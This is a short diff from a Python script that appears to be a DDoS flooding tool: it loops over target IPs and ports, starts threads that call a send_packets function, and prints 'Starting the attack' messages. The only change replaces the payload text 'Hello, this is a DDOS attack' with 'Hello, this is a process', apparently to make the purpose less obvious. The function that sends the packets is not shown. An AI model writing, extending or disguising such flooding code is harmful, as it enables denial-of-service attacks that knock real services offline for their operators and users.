@@ -56,7 +56,7 @@ time.sleep(3)
 for ip in ips:
     for port in ports:
         # Use a bytes literal to create the data
-        data = b'Hello, this is a DDOS attack'
+        data = b'Hello, this is a process'
         print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")
         for i in range(threads):
             t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
